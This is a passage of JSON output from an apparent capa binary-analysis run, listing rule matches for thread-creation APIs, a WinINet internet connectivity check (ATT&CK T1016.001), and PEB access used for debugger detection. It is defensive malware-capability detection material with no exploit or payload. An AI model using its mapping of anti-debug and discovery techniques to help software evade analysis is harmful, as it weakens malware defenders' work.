                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "pthread_create"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "System.Threading.Thread::Start"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Thread::ctor"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "CreateThread"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442471347
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_beginthread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_beginthreadex"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "PsCreateSystemThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SHCreateThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SHCreateThreadWithHandle"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "CreateRemoteThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "CreateRemoteThreadEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RtlCreateUserThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtCreateThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtCreateThreadEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwCreateThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwCreateThreadEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442471385
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "pthread_create"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "System.Threading.Thread::Start"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Thread::ctor"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "CreateThread"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442471410
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_beginthread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_beginthreadex"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "PsCreateSystemThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SHCreateThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SHCreateThreadWithHandle"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "CreateRemoteThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "CreateRemoteThreadEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RtlCreateUserThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtCreateThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtCreateThreadEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwCreateThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwCreateThreadEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "check Internet connectivity via WinINet": {
        "meta": {
          "name": "check Internet connectivity via WinINet",
          "namespace": "host-interaction/network/connectivity",
          "authors": [
            "matthew.williams@mandiant.com",
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "basic block"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "System Network Configuration Discovery",
                "Internet Connection Discovery"
              ],
              "tactic": "Discovery",
              "technique": "System Network Configuration Discovery",
              "subtechnique": "Internet Connection Discovery",
              "id": "T1016.001"
            }
          ],
          "mbc": [],
          "references": [],
          "examples": [
            "648FC498110B11B4313A47A776E6BA40:0x6633F0"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: check Internet connectivity via WinINet\r\n    namespace: host-interaction/network/connectivity\r\n    authors:\r\n      - matthew.williams@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: basic block\r\n      dynamic: unsupported  # requires mnemonic features\r\n    att&ck:\r\n      - Discovery::System Network Configuration Discovery::Internet Connection Discovery [T1016.001]\r\n    examples:\r\n      - 648FC498110B11B4313A47A776E6BA40:0x6633F0\r\n  features:\r\n    - or:\r\n      - and:\r\n        - or:\r\n          - api: wininet.InternetGetConnectedState\r\n          - api: wininet.InternetCheckConnection\r\n        - optional:\r\n          - instruction:\r\n            - mnemonic: cmp\r\n            - or:\r\n              - number: 0 = FALSE\r\n              - number: 1 = TRUE\r\n      - api: wininet.InternetAttemptConnect\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442468950
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "InternetAttemptConnect"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "InternetGetConnectedState"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "InternetCheckConnection"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442468962
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "check Internet connectivity via WinINet/25bb96734ab34b67a4339b7f416f1d84"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "PEB access": {
        "meta": {
          "name": "PEB access",
          "authors": [
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "basic block"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Anti-Behavioral Analysis",
                "Debugger Detection",
                "Process Environment Block"
              ],
              "objective": "Anti-Behavioral Analysis",
              "behavior": "Debugger Detection",
              "method": "Process Environment Block",
              "id": "B0001.019"
            }
          ],
          "references": [
            "https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiDebug/NtGlobalFlag.cpp"
          ],
          "examples": [
            "al-khaser_x86.exe_:0x420D20"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: PEB access\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n    lib: true\r\n    scopes:\r\n      static: basic block\r\n      dynamic: unsupported  # requires characteristic, offset, mnemonic features\r\n    mbc:\r\n      - Anti-Behavioral Analysis::Debugger Detection::Process Environment Block [B0001.019]\r\n    references:\r\n      - https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiDebug/NtGlobalFlag.cpp\r\n    examples:\r\n      - al-khaser_x86.exe_:0x420D20\r\n  features:\r\n    - or:\r\n      - characteristic: peb access\r\n      - and:\r\n        # https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiDebug/NtGlobalFlag.cpp#L41\r\n        - arch: i386\r\n        - characteristic: fs access\r\n        - or:\r\n          # in 0f5d5d07c6533bc6d991836ce79daaa1\r\n          # then we have:\r\n          #\r\n          #     xor edx, edx\r\n          #     mov edx, fs:[edx+30h]\r\n          - offset: 0x30\r\n          - instruction:\r\n            # in the case of CallObfuscator, gs:[rax]\r\n            - mnemonic: add\r\n            - number: 0x30\r\n      - and:\r\n        - arch: amd64\r\n        - characteristic: gs access\r\n        - or:\r\n          - offset: 0x60\r\n          - instruction:\r\n            - mnemonic: add\r\n            - number: 0x60\r\n      - and:\r\n        # WoW64 PEB address is fetched via the WoW64 Thread Environment Block (TEB) at FS:[0x18]-0x2000\r\n        # https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiDebug/NtGlobalFlag.cpp#L45\r\n        - characteristic: fs access\r\n        - instruction:\r\n          - mnemonic: sub\r\n          - number: 0x2000\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442632524
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "peb access"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "fs access"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "PEB access/4fa8f9e3f3004a838491d62a996c25bc"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "arch",
                          "arch": "i386"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "fs access"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 48
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "PEB access/8e9dfb200ff14baa9c141a8c00944ffa"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "arch",
                          "arch": "amd64"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "gs access"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442632524
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 96
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442632533
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "PEB access/789317378cba4362bb84408db1827b9e"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442632552
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "peb access"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "fs access"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "PEB access/4fa8f9e3f3004a838491d62a996c25bc"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "arch",
                          "arch": "i386"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "fs access"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 48
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "PEB access/8e9dfb200ff14baa9c141a8c00944ffa"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "arch",
                          "arch": "amd64"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "gs access"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442632552
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 96
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442632561
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "PEB access/789317378cba4362bb84408db1827b9e"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "contain loop": {
        "meta": {
          "name": "contain loop",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [],
          "mbc": [],
          "references": [],
          "examples": [
            "08AC667C65D36D6542917655571E61C8:0x406EAA"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: contain loop\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    lib: true\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported  # requires characteristic features\r\n    examples:\r\n      - 08AC667C65D36D6542917655571E61C8:0x406EAA\r\n  features:\r\n    - or:\r\n      - characteristic: loop\r\n      - characteristic: tight loop\r\n      - characteristic: recursive call\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442457216
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442457296
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442458272
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442458304
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442458368
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442458400
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442458640
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442458688
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442458992
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442458992
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442459296
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442459776
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442459776
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442463968
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442464337
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442465392
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
